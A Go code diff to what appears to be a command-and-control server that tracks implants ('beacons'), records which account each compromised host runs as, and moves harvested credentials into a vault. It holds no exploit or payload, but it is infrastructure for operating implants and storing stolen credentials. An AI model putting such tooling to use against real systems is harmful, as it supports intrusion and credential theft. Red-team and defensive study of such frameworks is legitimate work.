@@ -351,6 +351,9 @@ func (h *Hub) UnregisterSession(agentID, sessionID string) {
 	if h.store.MarkOffline(agentID) {
 		h.Emit(Event{Kind: "agent.offline", AgentID: agentID})
 	}
+	// The identity of the agent goes with its session: the server does not
+	// claim that a host runs as somebody else while nobody is listening.
+	h.store.SetImpersonation(agentID, "")
 	h.store.SaveAsync()
 }
 
@@ -365,6 +368,16 @@ func (h *Hub) UnregisterAgent(agentID string) {
 		h.Emit(Event{Kind: "agent.offline", AgentID: agentID})
 	}
 	h.store.SaveAsync()
+}
+
+// SetImpersonation records the account an agent runs as.
+//
+// The beacon says it in the check-in, so the inventory shows the truth
+// instead of the account the implant started with.
+func (h *Hub) SetImpersonation(agentID, account string) {
+	if h.store.SetImpersonation(agentID, account) {
+		h.store.SaveAsync()
+	}
 }
 
 // Live returns the live link info for an agent.
@@ -669,10 +682,17 @@ func (h *Hub) AppendTaskOutput(agentID, taskID string, chunk []byte, meta map[st
 
 // CompleteTask stores a result and notifies operators.
 func (h *Hub) CompleteTask(agentID, taskID string, code int64, output []byte, errMsg string, meta map[string]any) {
+	// The material of a credential task goes to the vault, not into the
+	// task record and not into the event stream: the shape of the material
+	// stays, the value does not.
+	entries, hasCreds := redactCredentials(h.taskKind(taskID), meta)
 	t, ok := h.store.Complete(taskID, code, output, errMsg, meta)
 	if !ok {
 		h.log.Warn("result for unknown task", "agent", agentID, "task", taskID)
 		return
+	}
+	if hasCreds {
+		h.storeCredentials(agentID, entries)
 	}
 	data := map[string]any{
 		"code": t.Code, "state": t.State, "err": t.Err,
